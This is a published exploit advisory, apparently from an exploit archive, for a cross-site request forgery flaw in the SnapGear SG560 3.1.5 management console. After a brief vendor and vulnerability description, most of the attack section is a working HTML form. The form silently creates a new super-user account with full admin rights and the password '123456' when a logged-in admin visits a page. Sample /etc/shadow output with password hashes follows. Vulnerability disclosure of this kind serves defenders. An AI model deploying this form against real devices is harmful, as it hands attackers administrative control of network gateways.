@@ -1,0 +1,72 @@
+# Title: SnapGear Management Console SG560 3.1.5 - Cross-Site Request Forgery (Add Super User)
+# Author: LiquidWorm
+# Date: 2020-06-04
+# Vendor: http://www.securecomputing.com
+# CVE:  N/A
+
+Secure Computing SnapGear Management Console SG560 v3.1.5 CSRF Add Super User
+
+
+Vendor: Secure Computing Corp.
+Product web page: http://www.securecomputing.com
+Affected version: 3.1.5u1
+
+Summary: The SG gateway appliance range provides Internet security and
+privacy of communications for small and medium enterprises, and branch 
+offices. It simply and securely connects your office to the Internet,
+and with its robust stateful firewall, shields your computers from
+external threats.
+
+Desc: The application interface allows users to perform certain actions
+via HTTP requests without performing any validity checks to verify the
+requests. This can be exploited to perform certain actions with administrative
+privileges if a logged-in user visits a malicious web site.
+
+Tested on: fnord/1.9
+           Apache 1.3.27 (Unix)
+           Linux 2.4.31
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2020-5567
+Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2020-5567.php
+
+
+14.05.2020
+
+--
+
+
+CSRF Add Super User:
+--------------------
+
+<html>
+  <body>
+    <form action="http://10.0.2.2/cgi-bin/cgix/adminusers" method="POST">
+      <input type="hidden" name=".form" value="edit" />
+      <input type="hidden" name=".page" value="adminusers_edit" />
+      <input type="hidden" name="login" value="testingus" />
+      <input type="hidden" name="fullname" value="ZSL" />
+      <input type="hidden" name="password" value="123456" />
+      <input type="hidden" name="confirm" value="123456" />
+      <input type="hidden" name="acl.login" value="on" />
+      <input type="hidden" name="acl.admin" value="on" />
+      <input type="hidden" name="acl.diags" value="on" />
+      <input type="hidden" name="acl.saverestore" value="on" />
+      <input type="hidden" name="acl.setpassword" value="on" />
+      <input type="hidden" name="finish" value="Finish" />
+      <input type="hidden" name=".defaultname" value="finish" />
+      <input type="submit" value="Idemo" />
+    </form>
+  </body>
+</html>
+
+Result /etc/shadow:
+
+root:$1$YC$T/M8HLRXxKKPVEO7SU.02/:0:0:Super User:/:/bin/sh
+sshd:!!:100:65534::/home:/bin/false
+clamav:!!:103:65534::/home:/bin/false
+testingus:$1$Xy$bxdLgsRlXHoMjEcMKqVq/.:104:104:ZSL:/home:/bin/sh
